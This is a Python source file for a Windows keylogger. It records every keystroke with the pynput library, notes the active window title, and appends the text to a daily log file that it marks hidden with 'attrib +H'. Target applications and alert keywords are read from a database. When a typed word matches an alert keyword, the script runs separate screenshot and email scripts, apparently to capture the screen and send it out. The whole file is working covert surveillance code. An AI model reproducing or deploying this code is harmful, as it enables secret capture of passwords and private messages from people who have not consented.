#!/usr/bin/python
#pynput
# %(asctime)s: 
from pynput.keyboard import Key, Listener
#import logging
from subprocess import call
import subprocess
from getsqldata import *
import win32gui
from datetime import datetime

uid = getCurrentUser()
lastActiveWindow = None
hasSubmitted = None

st = getRowValue("Setting",uid)
#get path from db
file = st[1] + datetime.now().strftime('%Y_%m_%d')+'.txt' #or full path if not in same directory
# create file log
try:
    f = open(file, 'x')
    f.close()
except :
    pass

#hidden file log
subprocess.check_call(["attrib","+H",file],shell=True)

#logfile = open('./key_log.txt', 'a+', encoding='utf-8')
#logging.basicConfig(stream = logfile, level=logging.DEBUG, format=u'%(message)s')
#iBack = 0

word = u''

listBreakWord = ["Key.enter","Key.space"]
listSpecialKey = ["Key.tab","Key.caps_lock","Key.shift",
                  "Key.ctrl_l","Key.cmd","Key.alt_l","Key.alt_r",
                  "Key.print_screen","Key.ctrl_r","Key.page_up",
                  "Key.page_down","Key.up","Key.down","Key.left",
                  "Key.right","Key.shift_r","Key.home","Key.insert",
                  "Key.end","Key.esc","Key.delete"]#,"Key.backspace"]

def alerts(alertList, word):
    conf = getRowValue("Alerts",uid)
    word = word.strip() #remove last character like space \t \n \r
    if(word in alertList):
        if conf[2] == 1:
            call("python screenshot.py", shell=True)
            print("Alert - screenshot successful")
        if conf[1] == 1:
            call("python email.py", shell=True)
            print("Alert - send email successful")

def target(uid, activeWindows):
    conf = getRowValue("Targets",uid)
    result = 0
    if conf[1] == 1: # all app
        return True
    if conf[2] == 1: # following app
        byName = getColumnValue("byName","TargetList",uid)
        byApp = getColumnValue("byApp","TargetList",uid)
        #print('-'*50 )
        #print (byName)
        #print(byApp)
        #print('-'*50)
        for name in byName:
            #print(name.lower()+'---'+ activeWindows.lower())
            if activeWindows.lower().find(name.lower()) > -1 :
                #print("TRUE")
                return True
        for app in byApp:
            #print(app.lower()+'---'+ activeWindows.lower())
            if app.lower() == activeWindows.lower():
                #print("TRUE")
                return True
    #print("false")
    return False


def on_press(key):
    global word, iBack, lastActiveWindow, hasSubmitted
    #logging.info(key)
    ch = u''
    ch = str(key)
    
    if(str(key) not in listSpecialKey):
        ch = str(key).replace("'","")
    else:
        ch = ''
    if(str(key) == "Key.enter"):
        ch = '\n'
    if(str(key) == "Key.space"):
        ch = u' '
    
    word += ch
    pos = 0

    #print("word : " +word+"\tch : " +ch)
    #print(st)
    if( st[4] == 0 ):
    #English
        if(str(key)=="Key.backspace"):
            pos = word.find("Key.backspace")
            word = word[:(pos-1)]
            ch = ''
    
    elif ( st[4] == 1 ):
        #Vietnamese
        if(str(key) == "Key.backspace" ):
            iBack = iBack + 1
            pos = word.find("Key.backspace")
            if (iBack == 1):
                word = word[:(pos-2)]
                #print("if 1 :word : " + word + "\t iBack : " + str(iBack))
            elif(iBack > 1):
                word  = word[:(pos-1)]
                #print("if 2 :word : " + word + "\t iBack : " + str(iBack))
        else:
            iBack = 0
    if(target(uid,getWindowText())):
        if (lastActiveWindow != win32gui.GetForegroundWindow()):
            name = '\n' + getWindowText() + datetime.now().strftime(':%Y/%m/%d-%H:%M:%S') +'\n'
            if(hasSubmitted):
                name = '\n' + name + '\n'

            with open(file, 'a', encoding='utf-8') as f:
                f.write(name)
        
            hasSubmitted = True;
            lastActiveWindow = win32gui.GetForegroundWindow();
            

        with open(file, 'a', encoding='utf-8') as f:
            f.write(ch)
            print(ch)

    if(str(key) in listBreakWord):
        listKey = getColumnValue("key","AlertList",1)
        alerts(listKey,word)
        word = u''
        #iBack = 0

def getWindowText():
    winText = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return winText

with Listener(on_press=on_press) as listener:
    listener.join()

